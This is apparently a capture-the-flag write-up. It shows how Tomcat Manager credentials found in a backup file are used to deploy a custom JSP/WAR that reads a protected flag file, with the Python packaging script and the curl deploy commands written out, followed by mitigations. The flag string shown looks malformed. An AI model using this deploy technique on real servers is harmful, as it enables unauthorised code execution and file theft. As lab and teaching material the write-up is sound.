The target system has Apache Tomcat 9 running on port 8080 with the Manager application enabled. A backup configuration file revealed credentials for the manager role, allowing us to deploy a custom WAR application to read the flag file located in the Tomcat installation directory.

Step-by-Step Exploitation:

1. Discovery of Credentials:
The file /etc/tomcat9/Tomcat-Users.xml.bak contained the following entry:
<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>

These credentials provided full access to the Tomcat Manager application.

2. Identify Target File:
The flag file was located at: /var/lib/tomcat9/flag4.txt
With restrictive permissions: -rw------- 1 tomcat tomcat
This meant only the tomcat user could read the file directly.

3. Creation of Custom JSP File:
A simple JSP file was created to read the flag:
<% page import="java.io.*" %><% String file = "/var/lib/tomcat9/flag4.txt"; FileReader fr = new FileReader(file); BufferedReader br = new BufferedReader(fr); String line; while((line=br.readLine())!=null) { out.println(line); } %>

4. WAR Artifact Creation using Python:
Python was used to create the WAR artifact due to the absence of the 'jar' command:
import zipfile
import os

os.makedirs('/tmp/readflag/WEB-INF', exist_ok=True)

with open('/tmp/readflag/index.jsp', 'w') as f:
    f.write('<% page import="java.io.*" %><% String file = "/var/lib/tomcat9/flag4.txt"; FileReader fr = new FileReader(file); BufferedReader br = new BufferedReader(fr); String line; while((line=br.readLine())!=null) { out.println(line); } %>')

with open('/tmp/readflag/WEB-INF/web.xml', 'w') as f:
    f.write('<?xml version="1.0" encoding="UTF-8"?><web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1"></web-app>')

with zipfile.ZipFile('/tmp/readflag.war', 'w') as zipf:
    for root, dirs, files in os.walk('/tmp/readflag'):
        for file in files:
            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), '/tmp/readflag'))

5. Deployment via Tomcat Manager:
The WAR file was deployed using the credentials found earlier:
curl -u tomcatadm:"T0mc@t_s3cret_p@ss!" --upload-file /tmp/readflag.war "http://localhost:8080/manager/text/deploy?path=/readflag"

6. Flag Retrieval:
After deployment, the flag was retrieved by accessing the deployed application:
curl http://localhost:8080/readflag/

Flag value: LLPE{)m_th3_m3@nag3r_no7w

Technical Summary:
This exploitation demonstrates several critical security failures:
- Backup files (.bak) containing sensitive information
- Default/weak credentials for management consoles
- Ability to deploy arbitrary code via WAR files
- Restricted file permissions bypassed through web application logic

Mitigation Suggestions:
- Remove backup files from production environments
- Use strong, unique passwords for all service accounts
- Restrict access to the Manager application to trusted IP ranges
- Implement file system permissions to prevent web apps from reading arbitrary files
